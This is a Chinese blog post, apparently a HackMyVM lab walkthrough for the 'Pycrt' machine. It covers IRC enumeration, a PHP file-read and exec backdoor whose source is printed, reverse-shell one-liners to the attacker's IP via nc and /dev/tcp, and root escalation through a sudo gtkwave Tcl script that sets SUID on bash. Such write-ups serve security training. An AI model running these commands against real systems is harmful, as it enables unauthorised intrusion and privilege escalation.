@@ -1,0 +1,266 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>hackmyvm_Pycrt | myift</title><meta name="author" content="dgh"><meta name="copyright" content="dgh"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="扫描  80端口只有一个默认的apache页面没有扫描出其他的页面  但是 端口6667有个IRC服务(互联网中继聊天服务) 我们nc连接并发送一些标准的IRC命令来注册你的昵称和用户信息 ┌──(root㉿kali)-[~]└─# nc 192.168.56.106 6667:irc.local NOTICE * :*** Looking up your hostname...NICK kali">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hackmyvm_Pycrt">
+<meta property="og:url" content="http://example.com/2025/05/29/hackmyvm-Pycrt/index.html">
+<meta property="og:site_name" content="myift">
+<meta property="og:description" content="扫描  80端口只有一个默认的apache页面没有扫描出其他的页面  但是 端口6667有个IRC服务(互联网中继聊天服务) 我们nc连接并发送一些标准的IRC命令来注册你的昵称和用户信息 ┌──(root㉿kali)-[~]└─# nc 192.168.56.106 6667:irc.local NOTICE * :*** Looking up your hostname...NICK kali">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/image/png.png">
+<meta property="article:published_time" content="2025-05-29T13:27:20.000Z">
+<meta property="article:modified_time" content="2025-05-29T13:30:05.782Z">
+<meta property="article:author" content="dgh">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/image/png.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "hackmyvm_Pycrt",
+  "url": "http://example.com/2025/05/29/hackmyvm-Pycrt/",
+  "image": "http://example.com/image/png.png",
+  "datePublished": "2025-05-29T13:27:20.000Z",
+  "dateModified": "2025-05-29T13:30:05.782Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "dgh",
+      "url": "http://example.com/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2025/05/29/hackmyvm-Pycrt/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'hackmyvm_Pycrt',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/image/png.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/image/png1.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">myift</span></a><a class="nav-page-title" href="/"><span class="site-name">hackmyvm_Pycrt</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">hackmyvm_Pycrt</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-05-29T13:27:20.000Z" title="发表于 2025-05-29 21:27:20">2025-05-29</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-05-29T13:30:05.782Z" title="更新于 2025-05-29 21:30:05">2025-05-29</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id=""><a href="#" class="headerlink" title=""></a><img src="/../imgs/$%7Bfiilename%7D/image-20250527214031548.png" alt="image-20250527214031548"></h1><p>扫描</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/image-20250527214105625.png" alt="image-20250527214105625"></p>
+<p>80端口只有一个默认的apache页面没有扫描出其他的页面</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/image-20250527214551581.png" alt="image-20250527214551581"></p>
+<p>但是 端口6667有个IRC服务(互联网中继聊天服务)</p>
+<p>我们nc连接并发送一些标准的IRC命令来注册你的昵称和用户信息</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# nc 192.168.56.106 6667</span><br><span class="line">:irc.local NOTICE * :*** Looking up your hostname...</span><br><span class="line">NICK kali_pentester</span><br><span class="line">:irc.local NOTICE * :*** Could not resolve your hostname: Request timed out; using your IP address (192.168.56.103) instead.</span><br><span class="line"></span><br><span class="line">USER kali 0 * :Kali Pentester</span><br><span class="line">:irc.local 001 kali_pentester :Welcome to the Localnet IRC Network kali_pentester!kali@192.168.56.103</span><br><span class="line">:irc.local 002 kali_pentester :Your host is irc.local, running version InspIRCd-3</span><br><span class="line">:irc.local 003 kali_pentester :This server was created 09:36:52 May 27 2025</span><br><span class="line">:irc.local 004 kali_pentester irc.local InspIRCd-3 iosw biklmnopstv :bklov</span><br><span class="line">:irc.local 005 kali_pentester AWAYLEN=200 CASEMAPPING=rfc1459 CHANLIMIT=#:20 CHANMODES=b,k,l,imnpst CHANNELLEN=64 CHANTYPES=# ELIST=CMNTU HOSTLEN=64 KEYLEN=32 KICKLEN=255 LINELEN=512 MAXLIST=b:100 :are supported by this server</span><br><span class="line">:irc.local 005 kali_pentester MAXTARGETS=20 MODES=20 NAMELEN=128 NETWORK=Localnet NICKLEN=30 PREFIX=(ov)@+ SAFELIST STATUSMSG=@+ TOPICLEN=307 USERLEN=10 USERMODES=,,s,iow WHOX :are supported by this server</span><br><span class="line">:irc.local 251 kali_pentester :There are 0 users and 0 invisible on 1 servers</span><br><span class="line">:irc.local 253 kali_pentester 1 :unknown connections</span><br><span class="line">:irc.local 254 kali_pentester 0 :channels formed</span><br><span class="line">:irc.local 255 kali_pentester :I have 0 clients and 0 servers</span><br><span class="line">:irc.local 265 kali_pentester :Current local users: 0  Max: 1</span><br><span class="line">:irc.local 266 kali_pentester :Current global users: 0  Max: 1</span><br><span class="line">:irc.local 375 kali_pentester :irc.local message of the day</span><br><span class="line">:irc.local 372 kali_pentester : **************************************************</span><br><span class="line">:irc.local 372 kali_pentester : *             H    E    L    L    O              *</span><br><span class="line">:irc.local 372 kali_pentester : *  This is a private irc server. Please contact  *</span><br><span class="line">:irc.local 372 kali_pentester : *  the admin of the server for any questions or  *</span><br><span class="line">:irc.local 372 kali_pentester : *  issues ShadowSec directory.                   *</span><br><span class="line">:irc.local 372 kali_pentester : **************************************************</span><br><span class="line">:irc.local 372 kali_pentester : *  The software was provided as a package of     *</span><br><span class="line">:irc.local 372 kali_pentester : *  Debian GNU/Linux &lt;https://www.debian.org/&gt;.   *</span><br><span class="line">:irc.local 372 kali_pentester : *  However, Debian has no control over this      *</span><br><span class="line">:irc.local 372 kali_pentester : *  server.                                       *</span><br><span class="line">:irc.local 372 kali_pentester : **************************************************</span><br><span class="line">:irc.local 372 kali_pentester : (The sysadmin possibly wants to edit &lt;/etc/inspircd/inspircd.motd&gt;)</span><br><span class="line">:irc.local 376 kali_pentester :End of message of the day.</span><br><span class="line">PING :irc.local</span><br><span class="line">ERROR :Closing link: (kali@192.168.56.103) [Ping timeout: 120 seconds]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>得到一个目录ShadowSec</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/image-20250527215927875.png" alt="image-20250527215927875"></p>
+<p>得到一个用户ID:ll104567</p>
+<p>用big本去扫描目录扫到</p>
+<p>&#x2F;bydataset.php</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Nothing to see here. </span><br></pre></td></tr></table></figure>
+
+<p>在这个页面模糊测试</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -s -w &quot;%&#123;size_download&#125;\n&quot; &quot;http://192.168.56.106/ShadowSec/bydataset.php?abc=123&quot; -o /dev/null</span><br><span class="line">测出无效响应的大小</span><br><span class="line">ffuf -u &#x27;http://192.168.55.36/ShadowSec/bydataset.php?FUZZ=../../.././../../etc/passwd&#x27; \</span><br><span class="line">-w /myift/fuzzDicts/fuzzDicts-master/paramDict/AllParam.txt -fs 21 -c</span><br></pre></td></tr></table></figure>
+
+<p>测出file参数可进行文件读取</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/image-20250528135709525.png" alt="image-20250528135709525"></p>
+<p>伪协议读一下源码</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/image-20250528135847860.png" alt="image-20250528135847860"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">function decrypt($input) &#123;</span><br><span class="line">    $reversed = strrev($input);</span><br><span class="line">    echo &quot;Reversed: &quot; . $reversed . &quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">    $decoded = base64_decode($reversed);</span><br><span class="line">    echo &quot;Decoded: &quot; . $decoded . &quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">    if ($decoded === false) &#123;</span><br><span class="line">        echo &quot;Base64 decoding failed.\n&quot;;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (strpos($decoded, &#x27;cmd:&#x27;) === 0) &#123;</span><br><span class="line">        return substr($decoded, 4);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] === &#x27;GET&#x27; &amp;&amp; isset($_GET[&#x27;file&#x27;])) &#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    if (stripos($file, &#x27;phpinfo&#x27;) !== false) &#123;</span><br><span class="line">        exit(&#x27;Access Denied&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    $filterUrl = &#x27;php://filter/convert.base64-encode/resource=&#x27; . $file;</span><br><span class="line">    $data = @file_get_contents($filterUrl);</span><br><span class="line">    if ($data === false) &#123;</span><br><span class="line">        exit(&#x27;Failed to read file&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    echo base64_decode($data);</span><br><span class="line">    exit;</span><br><span class="line">&#125; elseif ($_SERVER[&#x27;REQUEST_METHOD&#x27;] === &#x27;POST&#x27; &amp;&amp; isset($_POST[&#x27;auth&#x27;]) &amp;&amp; isset($_POST[&#x27;payload&#x27;])) &#123;</span><br><span class="line">    $auth = $_POST[&#x27;auth&#x27;];</span><br><span class="line">    $payload = $_POST[&#x27;payload&#x27;];</span><br><span class="line"></span><br><span class="line">    if ($auth !== &#x27;LetMeIn123!&#x27;) &#123;</span><br><span class="line">        exit(&#x27;Invalid Auth Token.&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $command = decrypt($payload);</span><br><span class="line">    if ($command !== false) &#123;</span><br><span class="line">        $output = exec($command);</span><br><span class="line">        echo &quot;&lt;pre&gt;$output&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;Payload decode failed.\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    exit;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;Nothing to see here.&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>源码逻辑很简单就是直接执行命令</p>
+<p>auth 参数： 必须是 LetMeIn123!<br>payload 参数： 需要经过两层编码：<br>你的命令前面加上 cmd:<br>对 cmd:<your_command> 进行 Base64 编码<br>对 Base64 编码后的字符串进行反转</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/image-20250528141218271.png" alt="image-20250528141218271"></p>
+<p>直接弹shell即可</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/image-20250528141336978.png" alt="image-20250528141336978"></p>
+<p><img src="/../imgs/$%7Bfiilename%7D/image-20250528143115879.png" alt="image-20250528143115879"></p>
+<p>有weechat</p>
+<p>这里要注意要把shell升级为交互形稳固状态才能成功启动</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/image-20250528150806982.png" alt="image-20250528150806982"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/exec busybox nc 192.168.56.103 1234 -e /bin/sh</span><br><span class="line"></span><br><span class="line">/exec !bash -i &gt;&amp; /dev/tcp/192.168.56.103/1234 0&gt;&amp;1</span><br><span class="line">直接弹shell</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../imgs/$%7Bfiilename%7D/image-20250528151229795.png" alt="image-20250528151229795"></p>
+<p>继续提权</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chatlake@PyCrt:~$ sudo -l</span><br><span class="line">Matching Defaults entries for chatlake on PyCrt:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User chatlake may run the following commands on PyCrt:</span><br><span class="line">    (ALL) NOPASSWD: /usr/bin/systemctl start irc_bot.service</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这个文件不能看但是可以运行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl cat irc_bot.service 命令的作用是显示 irc_bot.service 服务的完整配置文件内容。</span><br><span class="line">chatlake@PyCrt:~$ systemctl cat irc_bot.service</span><br><span class="line"># /etc/systemd/system/irc_bot.service</span><br><span class="line">[Unit]</span><br><span class="line">Description=IRC Bot Service</span><br><span class="line">After=network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">User=pycrtlake</span><br><span class="line">Group=pycrtlake</span><br><span class="line">WorkingDirectory=/usr/local/bin</span><br><span class="line">ExecStart=/usr/bin/python3 /usr/local/bin/irc_bot.py</span><br><span class="line">Restart=always</span><br><span class="line">RestartSec=5</span><br><span class="line">StandardOutput=syslog</span><br><span class="line">StandardError=syslog</span><br><span class="line">Environment=PYTHONUNBUFFERED=1</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br><span class="line">chatlake@PyCrt:~$ ls</span><br><span class="line">user.txt</span><br><span class="line">chatlake@PyCrt:~$ find / -name &quot;user.txt&quot; 2&gt;/dev/null</span><br><span class="line">^[[D^[[D/home/chatlake/user.txt</span><br><span class="line">chatlake@PyCrt:~$ find / -name &quot;irc_bot.py&quot; 2&gt;/dev/null</span><br><span class="line">/usr/local/bin/irc_bot.py</span><br><span class="line">chatlake@PyCrt:~$ find / -name &quot;irc_bot.service&quot; 2&gt;/dev/null</span><br><span class="line">/etc/systemd/system/irc_bot.service</span><br><span class="line"></span><br><span class="line">//服务将以 pycrtlake 用户的身份运行</span><br></pre></td></tr></table></figure>
+
+<p>启动服务看一下</p>
+<p>启动之后重新启动wechat</p>
+<p>然后添加server取名叫irc</p>
+<p>连接到本地irc服务器中</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/server add irc 127.0.0.1/6667</span><br><span class="line">/connect irc</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../imgs/$%7Bfiilename%7D/image-20250528154037703.png" alt="image-20250528154037703"></p>
+<p>发现有六个频道</p>
+<p>前面发现的用户id:ll104567</p>
+<p>设为昵称 &#x2F;nick ll104567</p>
+<p>进入频道返现没有什么东西</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/join  #chan1</span><br></pre></td></tr></table></figure>
+
+<p>在频道6</p>
+<p>随便发点东西过一会会发来一条提示</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/image-20250528154607689.png" alt="image-20250528154607689"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">│03:45:07 ll104567 | 2                                                                                                                                                                        │</span><br><span class="line">│03:45:08 ll104567 | 1                                                                                                                                                                        │</span><br><span class="line">│03:45:08 ll104567 | 3                                                                                                                                                                        │</span><br><span class="line">│03:45:48   @admin | My friends and I are chatting on it, but we all follow the formatting requirements. Finally, we need to:) End </span><br></pre></td></tr></table></figure>
+
+<p>得知发送的消息要以:)结尾</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">03:48:44 ll104567 | 111:)                                                                                                                                                                    │</span><br><span class="line">│03:48:48   @admin | My friends and I are chatting on it, but we all follow the formatting requirements. Finally, we need to:) End </span><br></pre></td></tr></table></figure>
+
+<p>但是在频道中聊天没有什么用我们去找admin私聊</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/query admin</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/../imgs/$%7Bfiilename%7D/image-20250528155438119.png" alt="image-20250528155438119"></p>
+<p>最后经过不断尝试才发现在#chan1发消息</p>
+<p>然后admin私聊回复你……</p>
+<p>我们发送数字会给我们返回一下符号字母什么的很明显是ASCII码</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/image-20250528160153309.png" alt="image-20250528160153309"></p>
+<p>可以执行命令</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/image-20250528160206259.png" alt="image-20250528160206259"></p>
+<p>直接弹shell</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/image-20250528160732605.png" alt="image-20250528160732605"></p>
+<p>shell很不稳定拿到之后第一时间稳定shell</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/image-20250528160703360.png" alt="image-20250528160703360"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pycrtlake@PyCrt:~$ sudo -l</span><br><span class="line">Matching Defaults entries for pycrtlake on PyCrt:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User pycrtlake may run the following commands on PyCrt:</span><br><span class="line">    (ALL) NOPASSWD: /usr/bin/gtkwave</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>gtkwave命令执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pycrtlake@PyCrt:~$ sudo gtkwave -h</span><br><span class="line">\Could not initialize GTK!  Is DISPLAY env var/xhost set?</span><br><span class="line"></span><br><span class="line">Usage: gtkwave [OPTION]... [DUMPFILE] [SAVEFILE] [RCFILE]</span><br><span class="line"></span><br><span class="line">  -n, --nocli=DIRPATH        use file requester for dumpfile name</span><br><span class="line">  -f, --dump=FILE            specify dumpfile name</span><br><span class="line">  -F, --fastload             generate/use VCD recoder fastload files</span><br><span class="line">  -o, --optimize             optimize VCD to FST</span><br><span class="line">  -a, --save=FILE            specify savefile name</span><br><span class="line">  -A, --autosavename         assume savefile is suffix modified dumpfile name</span><br><span class="line">  -r, --rcfile=FILE          specify override .rcfile name</span><br><span class="line">  -d, --defaultskip          if missing .rcfile, do not use useful defaults</span><br><span class="line">  -D, --dualid=WHICH         specify multisession identifier</span><br><span class="line">  -l, --logfile=FILE         specify simulation logfile name for time values</span><br><span class="line">  -s, --start=TIME           specify start time for LXT2/VZT block skip</span><br><span class="line">  -e, --end=TIME             specify end time for LXT2/VZT block skip</span><br><span class="line">  -t, --stems=FILE           specify stems file for source code annotation</span><br><span class="line">  -c, --cpu=NUMCPUS          specify number of CPUs for parallelizable ops</span><br><span class="line">  -N, --nowm                 disable window manager for most windows</span><br><span class="line">  -M, --nomenus              do not render menubar (for making applets)</span><br><span class="line">  -S, --script=FILE          specify Tcl command script file for execution</span><br><span class="line">  -T, --tcl_init=FILE        specify Tcl command script file to be loaded on startup</span><br><span class="line">  -W, --wish                 enable Tcl command line on stdio</span><br><span class="line">  -R, --repscript=FILE       specify timer-driven Tcl command script file</span><br><span class="line">  -P, --repperiod=VALUE      specify repscript period in msec (default: 500)</span><br><span class="line">  -X, --xid=XID              specify XID of window for GtkPlug to connect to</span><br><span class="line">  -1, --rpcid=RPCID          specify RPCID of GConf session</span><br><span class="line">  -2, --chdir=DIR            specify new current working directory</span><br><span class="line">  -3, --restore              restore previous session</span><br><span class="line">  -4, --rcvar                specify single rc variable values individually</span><br><span class="line">  -5, --sstexclude           specify sst exclusion filter filename</span><br><span class="line">  -I, --interactive          interactive VCD mode (filename is shared mem ID)</span><br><span class="line">  -C, --comphier             use compressed hierarchy names (slower)</span><br><span class="line">  -g, --giga                 use gigabyte mempacking when recoding (slower)</span><br><span class="line">  -L, --legacy               use legacy VCD mode rather than the VCD recoder</span><br><span class="line">  -v, --vcd                  use stdin as a VCD dumpfile</span><br><span class="line">  -O, --output=FILE          specify filename for stdout/stderr redirect</span><br><span class="line">  -z, --slider-zoom          enable horizontal slider stretch zoom</span><br><span class="line">  -V, --version              display version banner then exit</span><br><span class="line">  -h, --help                 display this help then exit</span><br><span class="line">  -x, --exit                 exit after loading trace (for loader benchmarks)</span><br><span class="line"></span><br><span class="line">VCD files and save files may be compressed with zip or gzip.</span><br><span class="line">GHW files may be compressed with gzip or bzip2.</span><br><span class="line">Other formats must remain uncompressed due to their non-linear access.</span><br><span class="line">Note that DUMPFILE is optional if the --dump or --nocli options are specified.</span><br><span class="line">SAVEFILE and RCFILE are always optional.</span><br><span class="line"></span><br><span class="line">Report bugs to &lt;bybell@rocketmail.com&gt;.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-S, --script=FILE 和 -T, --tcl_init=FILE：指定 Tcl 脚本文件</span><br><span class="line"></span><br><span class="line">这是最直接的风险点。Tcl 是一种脚本语言，如果 gtkwave 允许通过这些参数加载并执行任意 Tcl 脚本文件，那么攻击者就可以创建一个 Tcl 脚本，在其中包含系统命令（例如 exec &quot;bash -i&quot;, system &quot;chmod 4755 /bin/sh&quot; 等）。</span><br><span class="line">由于 pycrtlake 可以 sudo gtkwave，这意味着这个 Tcl 脚本将以 root 权限执行，从而导致任意命令执行和直接提权。</span><br><span class="line">风险等级：高。这是此类漏洞的经典利用方式。</span><br></pre></td></tr></table></figure>
+
+<p>我们先创建一个利用文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;exec chmod u+s /bin/bash&quot; &gt; /tmp/root_shell.tcl</span><br></pre></td></tr></table></figure>
+
+<p>但是执行失败是因为没有图形界面</p>
+<p>可以用 Xvfb创建一个虚拟显示设备</p>
+<p>它可以创建一个虚拟的 X 服务器，从而在没有物理显示器或图形界面的系统上（比如服务器）运行图形应用程序。</p>
+<p>启动 Xvfb</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Xvfb :99 -screen 0 1024x768x24 &amp;</span><br></pre></td></tr></table></figure>
+
+<p>在即将运行 <code>gtkwave</code> 的终端会话中，需要设置 <code>DISPLAY</code> 环境变量，指向刚刚启动的 <code>Xvfb</code> 实例。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export DISPLAY=:99</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pycrtlake@PyCrt:~$ echo &quot;exec chmod u+s /bin/bash&quot; &gt; /tmp/root_shell.tcl</span><br><span class="line">pycrtlake@PyCrt:~$ sudo /usr/bin/gtkwave -S /tmp/root_shell.tcl</span><br><span class="line"></span><br><span class="line">GTKWave Analyzer v3.3.118 (w)1999-2023 BSI</span><br><span class="line"></span><br><span class="line">GTKWAVE | Use the -h, --help command line flags to display help.</span><br><span class="line"></span><br><span class="line">(gtkwave:1304): dconf-WARNING **: 06:57:12.187: failed to commit changes to dconf: Failed to execute child process ?dbus-launch? (No such file or directory)</span><br><span class="line">GTKWAVE | Executing Tcl script &#x27;/tmp/root_shell.tcl&#x27;</span><br><span class="line">^C</span><br><span class="line">pycrtlake@PyCrt:~$ ls -al /bin/bash</span><br><span class="line">-rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash</span><br><span class="line">pycrtlake@PyCrt:~$ bash -p</span><br><span class="line">bash-5.0# whoami</span><br><span class="line">root</span><br><span class="line">bash-5.0# </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
